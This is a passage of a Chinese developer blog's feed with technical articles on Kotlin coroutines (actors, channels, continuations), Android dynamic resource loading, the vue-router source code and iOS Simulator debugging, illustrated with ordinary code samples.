href="https://en.wikipedia.org/wiki/Futures_and_promises" target="_blank" rel="noopener">promise</a>, 而在kotlin，则会返回<code>Deferred</code>。顺便说一下，这里的 promise, future, deferred 或者 delay 通常描述的都是同一个概念:  异步方法 <em>promises</em> 许诺会返回一个值我们可以wait或者在之后再去获取。</p><p>在**(7)<strong><code>sendEmail(recipient.await(), msg.await())</code>处返回了<code>sendStatus</code>这个<code>Deferred</code>对象，</strong>(6)** <code>sendEmail</code>调用时传入的则是之前的Deferred对象。调用<code>Deferred.await()</code>会挂起当前函数，直到返回结果可用为止。最终我们在 <strong>(8)</strong> <code>sendStatus.await()</code>处返回发送结果。</p><h2 id="shared-mutable-state">Shared Mutable State</h2><p>虽然前面没有提及，但是读者可能也想到了coroutines之间同步的问题。并发的coroutines之间会共享状态，显然和其他编程语言一样，比如Java，意识到这一点很重要。 我们可以用一些常规的策略来解决同步问题，比如 <em>thread-safe data structures</em>, <em>confining</em> execution to a <em>single thread</em> 或者 使用 <em>locks</em>.<br>除了这些常规模式, Kotlin coroutines 鼓励使用 “share by communication” (see <a href="https://kotlinexpertise.com/kotlin-coroutines-guide/#qa" target="_blank" rel="noopener">QA</a>).</p><p>实际上，我们可以使用 “actor” 来表示被多个coroutines共享的状态。Coroutines 之间可以利用actors 来发送和接收消息。</p><h3 id="actors">Actors</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sealed</span> <span class="class"><span class="keyword">class</span> <span class="title">CounterMsg</span> </span>&#123;</span><br><span class="line">    <span class="keyword">object</span> IncCounter : CounterMsg() <span class="comment">// one-way message to increment counter</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GetCounter</span></span>(<span class="keyword">val</span> response: SendChannel&lt;<span class="built_in">Int</span>&gt;) : CounterMsg() <span class="comment">// a request with channel for reply.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">counterActor</span><span class="params">()</span></span> = GlobalScope.actor&lt;CounterMsg&gt; &#123; <span class="comment">//(1)</span></span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span> <span class="comment">//(9) &lt;/b&gt;actor state, not shared</span></span><br><span class="line">    <span class="keyword">for</span> (msg <span class="keyword">in</span> channel) &#123; <span class="comment">// handle incoming messages</span></span><br><span class="line">        <span class="keyword">when</span> (msg) &#123;</span><br><span class="line">            <span class="keyword">is</span> CounterMsg.IncCounter -&gt; counter++ <span class="comment">//(4)</span></span><br><span class="line">            <span class="keyword">is</span> CounterMsg.GetCounter -&gt; msg.response.send(counter) <span class="comment">//(3)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">getCurrentCount</span><span class="params">(counter: <span class="type">SendChannel</span>&lt;<span class="type">CounterMsg</span>&gt;)</span></span>: <span class="built_in">Int</span> &#123; <span class="comment">//(8)</span></span><br><span class="line">    <span class="keyword">val</span> response = Channel&lt;<span class="built_in">Int</span>&gt;() <span class="comment">//(2)</span></span><br><span class="line">    counter.send(CounterMsg.GetCounter(response))</span><br><span class="line">    <span class="keyword">val</span> receive = response.receive()</span><br><span class="line">    println(<span class="string">"Counter = <span class="variable">$receive</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> receive</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> = runBlocking&lt;<span class="built_in">Unit</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">val</span> counter = counterActor()</span><br><span class="line"></span><br><span class="line">    GlobalScope.launch &#123; <span class="comment">//(5)</span></span><br><span class="line">            <span class="keyword">while</span>(getCurrentCount(counter) &lt; <span class="number">100</span>)&#123;</span><br><span class="line">                delay(<span class="number">100</span>)</span><br><span class="line">                println(<span class="string">"sending IncCounter message"</span>)</span><br><span class="line">                counter.send(CounterMsg.IncCounter) <span class="comment">//(7)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    GlobalScope.launch &#123; <span class="comment">//(6)</span></span><br><span class="line">        <span class="keyword">while</span> ( getCurrentCount(counter) &lt; <span class="number">100</span>) &#123;</span><br><span class="line">            delay(<span class="number">200</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.join()</span><br><span class="line">    counter.close() <span class="comment">// shutdown the actor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子展示了<code>Actor</code>的使用, 实际上<code>Actor</code>本身就是一个coroutine。本例中的 actor 持有了 <strong>(9)</strong> 一个状态量 <code>counter</code>。接下来要介绍下 <strong>(2)</strong> <code>Channel</code>的概念。</p><h4 id="channels">Channels</h4><p><a href="https://github.com/Kotlin/kotlinx.coroutines/blob/master/docs/channels.md" target="_blank" rel="noopener">Channels</a> 提供了一种传递数据流的方法。和Java中的<code>BlockingQueue</code>类似 (消费者生产者pattern) ，不过Channels没有任何阻塞方法，而是提供了 <code>send</code> 和 <code>receive</code> 这两个 suspending functions 来按照<em>FIFO</em>的策略来生产和消费。</p><p>总是会有一个默认的actor和channels连接，通过这个actor可以与别的coroutines **(7)**交互。这上面的例子中，actor遍历了channel中的message，根据message的类型来决定是增加<code>counter</code>还是通过 <code>GetCounter</code>‘s <code>SendChannel</code>发送<code>counter</code> message。</p><p><code>main</code>中的第一个 coroutine 启动了一个一直向actor发送**(7)** <code>IncCounter</code> messages 的任务，直到<code>counter</code>大于100。第二个 <strong>(6)</strong> coroutine则挂起等待，直到<code>counter</code>到达100。每个coroutines都调用了suspending function <strong>(8)</strong><code>getCurrentCounter</code>, 其内部向actor发送了<code>GetCounter</code> message 并且挂起等待<code>receive</code>返回。</p><p>正如我们看到的，可变状态被限制在一个特定的actor coroutine内，并遵循了 <strong>share by communication</strong> 的原则，解决了共享可变状态的问题。</p><h3 id="more-features-and-examples">More Features and Examples</h3><p>更多文档和例子<a href="https://github.com/Kotlin/kotlinx.coroutines/tree/master/docs" target="_blank" rel="noopener">these</a>.</p><h2 id="how-it-works-implementation-of-kotlin-coroutines">How it works – Implementation of Kotlin Coroutines</h2><p>Coroutines的内部实现并不依赖于操作系统或者Java虚拟机。 与之相反，coroutines的实现机制在于编译器。编译器会将coroutines和<code>suspend</code> function转化为一个内部状态机，这个虚拟机可以维护和切换挂起的coroutines，并负责保持coroutines的内部状态。其原理来自于<a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.coroutines.experimental/-continuation/index.html" target="_blank" rel="noopener">Continuations</a>这个概念。 Continuations 会被编译器作为额外的一个参数传递给每个suspending function。这种技术实现也被称为<a href="https://en.wikipedia.org/wiki/Continuation-passing_style" target="_blank" rel="noopener">“Continuation-passing style”</a>。</p><p>下面我们来看下添加了continuation之后的function长什么样子。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">sampleSuspendFun</span><span class="params">(x: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">    delay(<span class="number">2000</span>)</span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过编译器转化后新方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static final Object sampleSuspendFun(int x, @NotNull Continuation var1)</span><br></pre></td></tr></table></figure><p>注意到上面的函数多了一个新的参数<code>Continuation</code>。当我们在coroutines里面调用这个方法时，编译器会将<code>sampleSuspendFun</code>之后的代码作为continuation参数传递。当<code>sampleSuspendFun</code>完成后，continuation 会被回调。这就是我们平时熟知的 callback-based 编程模式，只不过被编译器隐藏了实现细节。当然，这只是简化的一种描述，更多细节可以参考<a href="https://github.com/Kotlin/kotlin-coroutines/blob/master/kotlin-coroutines-informal.md#implementation-details" target="_blank" rel="noopener">implementation-details</a>.</p><h2 id="结论">结论</h2><p>相比Java，Kotlin鼓励另一种完全不同的——非阻塞式、并且不会绑定到native thread上的并发编程模式。</p><p>编写 Java 并发编程常常伴随着过多的线程，或者忘记了线程池管理，这些小粗心往往导致代码执行效率问题。Coroutines, 却相反, 正如 <em>“light-weight threads”</em> 这个别称所表明的一样, 它不会映射到物理线程上，而且正因如此，协程也不会遇到并发编程中常常遇到的deadlocks、starvation问。正如我们上面看到的，在协程中，通常不用担心线程阻塞。而且，同步也更加简单直接，甚至在遵循**“share by communication”** 原则后，同步操作都是不必要的，</p><p>协程可以和其他并发编程方式一起工作。其中，许多适配工作已经可以使用，而且其他的并发编程也可以轻松适配。<br>对于Java开发者来说，<code>async/await</code> 这种范式是最容易接受的，因为很容易和 <code>future</code> 联系起来。但是，<code>async/await</code>并不是简单的代替<code>future</code>而是功能上的升级。</p><p>在Java中写并发代码总是会写一堆模板代码来处理 <em>checked exceptions</em>, <em>defensive locking</em> 等一堆问题。得益于序列式编程、可管理性和可读性，这一切在coroutines中都得到了改善。</p><h4 id="perspective">Perspective</h4><p>在<a href="https://kotlinlang.org/docs/reference/whatsnew13.html#coroutines-release" target="_blank" rel="noopener">Kotlin 1.3</a>版本中，Coroutines终于移除了<code>experimental</code>包名，API也变得稳定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将从以下3个方面介绍 Kotlin Coroutines&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;/li&gt;
&lt;li&gt;使用方法&lt;/li&gt;
&lt;li&gt;内部实现原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文的实例代码基于Kotlin 1.3.0 和 kotlinx.coroutines 1.0.0。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>Android 资源动态加载(一)</title>
    <link href="https://deskid.github.io/2018/11/13/android-resource-hook/"/>
    <id>https://deskid.github.io/2018/11/13/android-resource-hook/</id>
    <published>2018-11-13T13:46:08.000Z</published>
    <updated>2018-11-14T02:26:35.842Z</updated>
    
    <content type="html"><![CDATA[<p>无论是插件化开发还是热修复，都有一个绕不过的关键技术难度。那就是——如何动态加载资源？</p><p>在插件化方案中，我们可以将资源和代码一起打包在插件中，宿主工程动态加载插件中的dex和资源，宿主工程和插件工程的开发流程实现了解耦。</p><p>在热修复中，我们除了常见的代码修复，还可以修改诸如文案，图标等资源文件，甚至可以利用资源热修复的能力在native上不发版玩一些资源运营。</p><a id="more"></a><h3 id="关键技术">关键技术</h3><p>在上面两种主要使用场景中，资源动态加载技术侧重点也有不同。</p><h4 id="插件化">插件化</h4><p>插件化注重的是插件与插件之间、插件与宿主之间资源的隔离。我们知道，插件的打包是和宿主工程分开打包，两个apk包生成的<code>R.java</code>是互相独立的，如果不做资源隔离，资源id很容易发生冲突。除非，在插件中只使用自己的资源，不共享宿主资源，并且插件只管理自己apk的<code>Resource</code>加载。</p><p>如果要合并资源的话，资源Id冲突的问题就不可避免了。插件化资源隔离的一种实现方式是改写aapt的代码，重新划分插件的packageId。packageId 占用两个字节，理论上我们可以使用<code>0x01~0xFF</code>之间的任何值，其中系统应用已经占用了<code>0x01</code>，共享库占用了<code>0x00</code>， 第三方应用则默认占用了<code>0x7F</code>。</p><h4 id="资源热修复">资源热修复</h4><p>资源热修复则关注于另一个要求：patch包和release包的资源ResId必须要一致。但是，我们知道，在生成的apk中，代码里的通过<code>name</code>去获取资源的地方，比如</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.getString(R.string.helloword);</span><br></pre></td></tr></table></figure><p>因为<code>R.string.xxxx</code>是整形常量，会被编译器inline优化掉。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">context.getString(2131427369)</span><br></pre></td></tr></table></figure><p>所以运行时是没有<code>name</code>信息的。因此我们不能简单通过替换相同<code>name</code>的资源去做热修复，这里必须通过替换相同<code>resId</code>的资源才可以。</p><p>所以在热修复中，资源修复的关键是，如何在 patch 包中打出拥有相同资源id的<code>resource.arsc</code>。也就是所谓的“资源Id固化”。</p><p>思路是通过修改<code>processResourcesTask</code>，给aapt传递 <code>--stable-ids public.txt</code>参数。（aapt 和 aapt2的具体参数有点不一样，但是大致思路是一致的）。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无论是插件化开发还是热修复，都有一个绕不过的关键技术难度。那就是——如何动态加载资源？&lt;/p&gt;
&lt;p&gt;在插件化方案中，我们可以将资源和代码一起打包在插件中，宿主工程动态加载插件中的dex和资源，宿主工程和插件工程的开发流程实现了解耦。&lt;/p&gt;
&lt;p&gt;在热修复中，我们除了常见的代码修复，还可以修改诸如文案，图标等资源文件，甚至可以利用资源热修复的能力在native上不发版玩一些资源运营。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="android" scheme="https://deskid.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>vue router 源码通读</title>
    <link href="https://deskid.github.io/2018/04/12/vue-router/"/>
    <id>https://deskid.github.io/2018/04/12/vue-router/</id>
    <published>2018-04-12T13:30:05.000Z</published>
    <updated>2018-11-14T02:27:34.349Z</updated>
    
    <content type="html"><![CDATA[<p>最近通读了一遍 vue-router 的源码，主要是想了解下面两个问题：</p><ol><li>路由信息发生变动时，router-view 如何动态渲染对应的 component</li><li>router-link 点击事件触发时，如何引发路由变化</li></ol><a id="more"></a><h2 id="1-抽象数据结构">1. 抽象数据结构</h2><h3 id="1-1-router">1.1 Router</h3><p><img src="/media/15235001906565.jpg" alt></p><p>Router，也就是 VueRouter，在 Vue 根实例化时，将<code>VueRouter</code>作为<code>router</code>参数值传入 Vue 框架。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  mode: <span class="string">'history'</span>,</span><br><span class="line">  routes: routes</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  store,</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>VueRouter 根据构造函数中传入的<code>option.mode</code> 来实例化不同的 history 对象。</p><p>通过传入的<code>option.routes</code>(<code>RouteConfig</code> 数组)，建立了 path 和 Component 之间的对应关系，这个关系存储在 VueRouter 的 <code>Matcher</code> 中。</p><p>在 <code>VueRouter.install()</code> 时，通过全局 mixin，hook 了 Vue 的生命周期 <code>beforeCreate</code>，并把这个<code>VueRouter</code>实例赋值给了<code>this._router</code>。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">Vue.mixin(&#123;</span><br><span class="line">    beforeCreate () &#123;</span><br><span class="line">      if (isDef(this.$options.router)) &#123;</span><br><span class="line">        this._routerRoot = this</span><br><span class="line"><span class="addition">+       this._router = this.$options.router</span></span><br><span class="line">        this._router.init(this)</span><br><span class="line">        //...</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        this._routerRoot = (this.$parent &amp;&amp; this.$parent._routerRoot) || this</span><br><span class="line">      &#125;</span><br><span class="line">    // ....</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>接下来又在<code>Vue.prototype</code>上定义了<code>$router</code>属性，方便在各个 component 中通过 <code>this.$router</code> 引用到 VueRouter。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$router'</span>, &#123;</span><br><span class="line">  get () &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._router &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>通过这个暴露出来的<code>this.$router</code>，可以实现“编程式导航”</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.push(&#123; <span class="attr">path</span>: <span class="string">'home'</span> &#125;)</span><br><span class="line"><span class="keyword">this</span>.$router.replace(&#123; <span class="attr">name</span>: <span class="string">'user'</span>, <span class="attr">params</span>: &#123; <span class="attr">userId</span>: <span class="number">123</span> &#125;&#125;)</span><br><span class="line"><span class="keyword">this</span>.$router.go(<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>在后面会了解到 <code>push</code> 、<code>replace</code>，<code>go</code> 方法只是在 <code>$router.history</code> 的方法上包了一层。</p><h3 id="1-2-route">1.2 Route</h3><p><img src="/media/15234379495016.jpg" alt></p><p>Route，路由信息对象，记录了路由所需的元信息和 URL 匹配到的 RouteRecord。</p><p>在 <code>VueRouter.install()</code> 时，Vue prototype 上注册了<code>$router</code>的同时，也注册了<code>$route</code>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$route'</span>, &#123;</span><br><span class="line">  get () &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._route &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里的 <code>$route</code> 就是 Route类型，它指向<code>this._routerRoot._route</code>，而<code>_route</code> 是通过<code>defineReactive</code>定义的响应式变量，其值双向绑定到了<code>this._router.history.current</code>。后者就是当前路由状态下激活的 Route 实例。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">  Vue.mixin(&#123;</span><br><span class="line">    beforeCreate () &#123;</span><br><span class="line">      if (isDef(this.$options.router)) &#123;</span><br><span class="line">        this._routerRoot = this</span><br><span class="line">        this._router = this.$options.router</span><br><span class="line">        this._router.init(this)</span><br><span class="line"><span class="addition">+       Vue.util.defineReactive(this, '_route', this._router.history.current)</span></span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        //...</span><br><span class="line">      &#125;</span><br><span class="line">    //...</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>每当 <code>_route</code> 值被 set，Vue 就会通知所有依赖的监听者，比如<code>$route</code>。</p><p>通过监听<code>$route</code> 就可以对路由的变化做出响应。在每个子组件中通过<code>this.$route</code> 可以直接取到 query、params 对象，非常实用。</p><p>举个例子，当 path 变化时触发一个 page event，就可以这么写：</p><p><img src="/media/15234387967416.jpg" alt></p><p>Route 中的 matched 数组存储的是当前路由状态下匹配的 RouterRecord。RouterRecord 中记录了路由对应的 component。</p><p>举个例子，某个 <code>vm.$route</code> 如下:<br><img src="/media/15234378286511.jpg" alt></p><p>直觉上一个路由状态匹配一个 Component 组件似乎很合理，那为什么这里<code>matched</code>是一个数组呢? 这个和 vue-router 支持路由嵌套有关，这里不深究。</p><p>通过上面的分析可以总结 ：</p><ol><li>vue-router 在 <code>Vue.prototype</code> 上定义了两个属性 <code>$router</code>、<code>$route</code></li><li><code>$router</code> 提供了 history 的几个关键方法：<code>push</code>、<code>replace</code>、<code>go</code></li><li><code>$route</code> 提供了路由元数据及对应的 component</li></ol><h3 id="1-3-history">1.3 History</h3><p>vue-router 中的 history 是根据 <code>mode</code> 初始化的。</p><p><img src="/media/15235056976931.jpg" alt></p><p><code>HTML5History</code>、<code>HashHistory</code>、<code>AbstractHistory</code> 都继承于 父类 <code>History</code>。</p><ul><li><p><code>HTML5History</code> 基于 html5 的 history 模式，通过<code>history.pushState</code>实现url 跳转而无需重新加载。</p></li><li><p><code>HashHistory</code> 利用 <code>#</code> 之后的部分路由，利用 <code>#</code> 改变不会触发页面请求的特性实现前端路由。</p></li><li><p><code>AbstractHistory</code> 内存中维护了一个数组来模拟路由 stack。</p></li></ul><p>回顾问题1</p><blockquote><ol><li>路由发生变动时，router-view 如何渲染对应的 component</li></ol></blockquote><p>上文说到 <code>$route.matched</code> 数组记录着路由对应的<code>component</code>，而且<code>$route</code>会实时随着 <code>_route</code> 变化而变化。所以问题1的答案，关键在于 <code>_route</code> 会怎样跟着路由变化。</p><p>那么<code>_route</code>是怎么被 set 的呢？</p><p>路由信息变动无非以下两种情况：</p><ol><li>函数式导航或者 RouterLink 组件，这两个本质都是调用 <code>router.push</code> 或者<code>router.replace</code></li><li>浏览器回退按钮或者 <code>history.back()</code></li></ol><p>第一种情况，只需要在<code>push</code>、<code>replace</code>函数调用结束后，更新下<code>_route</code>就好了。<br>第二种情况，可以监听<code>popstate</code>、<code>hashchange</code>事件，在监听函数中更新<code>_route</code></p><p>通过查看 History 的代码就知道 vue-router 也正是这么做的。</p><ul><li>第一种情况：调用 <code>router.push</code> 或者<code>router.replace</code></li></ul><p>在调用 <code>this.$router.push</code> 或者 <code>this.$router.replace</code> 时，其实是代理给了对应的 history 实例。</p><p>history 对<code>_route</code>的更新，具体表现在 <code>VueRouter.init()</code> 时， <code>history.listen()</code> 注册的回调。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.listen(<span class="function"><span class="params">route</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.apps.forEach(<span class="function">(<span class="params">app</span>) =&gt;</span> &#123;</span><br><span class="line">    app._route = route</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个回调函数作为 <code>listen()</code> 的参数传进来后被赋值给了 <code>history.cb</code>，那么 <code>history.cb</code> 在什么时候调用的呢？</p><p>调用顺序如下：</p><p><code>History.transitionTo()</code> =&gt;<br><code>History.confirmTransition.onComplete()</code> =&gt;<br><code>updateRoute()</code>=&gt;<br><code>this.cb()</code></p><p>部分相关代码也贴一下：</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"> transitionTo (location: RawLocation, onComplete?: Function, onAbort?: Function) &#123;</span><br><span class="line">    const route = this.router.match(location, this.current)</span><br><span class="line"><span class="addition">+   this.confirmTransition(route, () =&gt; &#123;</span></span><br><span class="line"><span class="addition">+     this.updateRoute(route)</span></span><br><span class="line">      onComplete &amp;&amp; onComplete(route)</span><br><span class="line">      // ...</span><br><span class="line">    &#125;, err =&gt; &#123;</span><br><span class="line">      // ...</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> updateRoute (route: Route) &#123;</span><br><span class="line">    const prev = this.current</span><br><span class="line">    this.current = route</span><br><span class="line"><span class="addition">+   this.cb &amp;&amp; this.cb(route)</span></span><br><span class="line">    this.router.afterHooks.forEach(hook =&gt; &#123;</span><br><span class="line">      hook &amp;&amp; hook(route, prev)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>无论是调用 <code>this.$router.push</code> 还是 <code>this.$router.replace</code> ，最终都会走到<code>transitionTo()</code>，从而更新<code>_route</code></p><ul><li>第二种情况：浏览器回退按钮或者 <code>history.back()</code></li></ul><p>对于<code>HTML5History</code>，在构造函数中监听了<code>popstate</code>，并在回调中调用了<code>transitionTo</code>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">constructor</span> (router: Router, base: ?string) &#123;</span><br><span class="line">    <span class="keyword">super</span>(router, base)</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'popstate'</span>, e =&gt; &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">this</span>.transitionTo(location, route =&gt; &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>对于<code>HashHistory</code>，则是延迟了<code>hashchange</code>监听，在第一次<code>init()</code> <code>transitonTo</code> 成功后，调用<code>setupListeners</code>监听<code>popstate</code>,或者<code>hashchange</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// this is delayed until the app mounts</span></span><br><span class="line"><span class="comment">// to avoid the hashchange listener being fired too early</span></span><br><span class="line">setupListeners () &#123;</span><br><span class="line">  <span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.addEventListener(supportsPushState ? <span class="string">'popstate'</span> : <span class="string">'hashchange'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    <span class="keyword">this</span>.transitionTo(getHash(), route =&gt; &#123;</span><br><span class="line">      <span class="comment">// ....</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-component">2. component</h2><h3 id="2-1-view-js">2.1 view.js</h3><p>RouterView是一个函数式组件，也就是说它本身没有上下文，也不管理或监听状态。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'RouterView'</span>,</span><br><span class="line">  functional: <span class="literal">true</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      <span class="keyword">default</span>: <span class="string">'default'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  render (_, &#123; props, children, parent, data &#125;) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">const</span> component = cache[name] = matched.components[name]</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">return</span> h(component, data, children)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面介绍到了，监听 location 变化的关键是响应式变量<code>$route</code>， render 函数渲染的正是 <code>$route.matched</code> 中存储的 Component。</p><p>第一个问题到这里就可以解答了。</p><p>RouterView 中有不少的细节处理值得注意</p><ul><li>render 使用的是 parent createElement() ，这样被 routerView 渲染的组件就可以解析 named slots。</li><li>利用 cache 来缓存 <code>keepalive</code>的 <code>inactive</code>状态下的的 component</li><li>route 的 params 作为 component 的 props 传递（没被 component 注册的 props 会被当作 attribute 传递）</li></ul><h3 id="2-2-link-js">2.2 link.js</h3><p>RouterLink 比较简单， 默认渲染为<code>&lt;a&gt;</code>节点，并设置该节点的 href 和事件。如果设置了 tag 名，则把 herf 和事件绑定到第一个<code>&lt;a&gt;</code>子节点, 如果没有<code>&lt;a&gt;</code>子节点则设置到它本身。</p><p><code>href</code> 由 <code>router.resolve</code> 解析生成；事件回调函数里调用<code>router.push</code>或<code>router.replace</code>做跳转。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> handler = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (guardEvent(e)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.replace) &#123;</span><br><span class="line">      router.replace(location)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      router.push(location)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，router-link 点击事件触发时，如何引发路由变化，这第二个问题也解决了。</p><h2 id="3-总结">3. 总结</h2><p>vue-router 还有许多别的特点，比如</p><ul><li>支持面向路由 的“AOP编程”(<code>navigation-guards</code>)，</li><li>支持路由嵌套</li><li>滚动位置定位</li></ul><p>配合 webpack 的动态 import 还能无痛实现路由懒加载。</p><p>如果用不到这些特性，同时希望能减少最终打包大小，经过上面的源码阅读，我们也完全有能力造一个符合自己需求的router轮子。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近通读了一遍 vue-router 的源码，主要是想了解下面两个问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;路由信息发生变动时，router-view 如何动态渲染对应的 component&lt;/li&gt;
&lt;li&gt;router-link 点击事件触发时，如何引发路由变化&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
      <category term="vue" scheme="https://deskid.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>iOS 和 Android 真机调试</title>
    <link href="https://deskid.github.io/2018/04/02/h5-debug/"/>
    <id>https://deskid.github.io/2018/04/02/h5-debug/</id>
    <published>2018-04-01T23:58:45.000Z</published>
    <updated>2018-11-14T03:15:13.473Z</updated>
    
    <content type="html"><![CDATA[<p>本文记录了如何在 iOS Simulator 和 Android 设备上调试 h5 页面，并在提供了 Alfred 脚本来便捷地管理 Simulator。</p><a id="more"></a><h2 id="ios-模拟器调试">iOS 模拟器调试</h2><p>1.启动<code>Simulator.app</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open -a /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app</span><br></pre></td></tr></table></figure><blockquote><p>tips：<code>xcode-select -p</code> 会打印当前 xcode developer 目录：</p></blockquote><blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/Applications/Xcode.app/Contents/Developer</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>上述命令可以写为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open -a `xcode-select -p`/Applications/Simulator.app</span><br></pre></td></tr></table></figure></blockquote><p>2.模拟器上打开要调试的页面</p><p>2.1 在 Safari 中打开</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xcrun simctl openurl booted 